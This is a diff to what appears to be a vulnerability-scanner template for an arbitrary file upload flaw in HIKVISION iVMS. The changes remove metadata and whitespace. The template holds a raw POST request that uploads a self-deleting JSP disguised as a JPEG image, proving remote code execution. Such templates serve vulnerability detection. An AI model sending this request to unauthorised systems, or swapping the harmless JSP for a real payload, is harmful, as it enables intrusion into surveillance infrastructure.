@@ -3,12 +3,8 @@ info:
   name: HIKVISION iVMS综合安防管理平台 resourceOperations 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ph9cle2nl01x00vy'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ph9cle2nl01x00vy
-    fofa: 暂无
 http:
 - raw:
   - 'POST /eps/api/resourceOperations/upload?token=Token HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <%out.print("hello world");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
